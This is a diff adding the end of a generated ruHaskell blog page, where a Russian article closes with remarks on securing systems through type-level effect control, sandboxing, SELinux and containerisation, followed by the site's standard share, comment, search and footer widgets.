+<p>Если кому-нибудь интересно, то можно продолжить.</p>
+<h4 id="как-решаются-подобные-проблемы-в-других-системах">Как решаются подобные проблемы в других системах?</h4>
+<p>Как мы могли заметить, возможность создания такого фреймворка полагается на мощную систему типов, позволяющую контролировать эффекты, чистоту языка и специальные расширения компилятора.</p>
+<p>Подобного эффекта можно добиться в языках, которые дают возможность использовать песочницы и позволяют подключить библиотеки для АОП (аспектно ориентированного программирования). Но такой подход значительно усложняет архитектуру приложения.</p>
+<p>В операционных системах так же существуют специльные решения, направленные на решение той же проблемы, например selinux.</p>
+<p>В целом же защищенная система должна включать защиты на всех уровнях, возможная контейнеризация, selinux, безопасность внутри программы, только в этом случае решение может быть достигнуто. Но подобные библиотеки и возможности языка существенно повышают качество системы.</p>
+
+<div id="socialButtons">
+    <a href="https://twitter.com/share" class="twitter-share-button" data-lang="ru">Твитнуть</a> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+    <div class="g-plus" data-action="share" data-annotation="bubble"></div>
+</div>
+
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'ruhaskell'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    
+
+        </div> 
+
+        <div id="searchForm">
+            <script>
+              (function() {
+                var cx = '007697214108744450483:w49n7qbvpdy';
+                var gcse = document.createElement('script');
+                gcse.type = 'text/javascript';
+                gcse.async = true;
+                gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+                    '//www.google.com/cse/cse.js?cx=' + cx;
+                var s = document.getElementsByTagName('script')[0];
+                s.parentNode.insertBefore(gcse, s);
+              })();
+            </script>
+            <gcse:search></gcse:search>
+        </div>
+
+        <footer class="footer">
+            Сайт работает на <strong><a href="http://jaspervdj.be/hakyll/" target="_blank">Hakyll</a></strong> и живёт на <strong><a href="https://github.com/ruHaskell/ruhaskell" target="_blank">GitHub</a></strong>.
+            <div class="stargaze">
+                <a data-count-api="/repos/ruHaskell/ruhaskell#stargazers_count" data-count-href="/ruHaskell/ruhaskell/stargazers" data-icon="octicon-star" href="https://github.com/ruHaskell/ruhaskell" class="github-button">Star</a>
+
+                <span style="padding-left: 20px;"></span>            
+                
+                <a data-count-api="/repos/ruHaskell/ruhaskell#forks_count" data-count-href="/ruHaskell/ruhaskell/network" data-icon="octicon-git-branch" href="https://github.com/ruHaskell/ruhaskell" class="github-button">Fork</a>
+            </div>
+
+            <div class="copyright-note">
+                Исходный код данного сайта, а также все опубликованные на нём материалы распространяются на условиях <a href="https://github.com/ruHaskell/ruhaskell/blob/master/LICENSE" target="_blank">свободной лицензии MIT</a>.
+            </div>
+        </footer>
+    </div>
+
+<script type="text/javascript">
+/* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+var disqus_shortname = 'ruhaskell'; // required: replace example with your forum shortname
+
+/* * * DON'T EDIT BELOW THIS LINE * * */
+(function () {
+var s = document.createElement('script'); s.async = true;
+s.type = 'text/javascript';
+s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+(document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script> 
+
+  </body>
+</html>
+
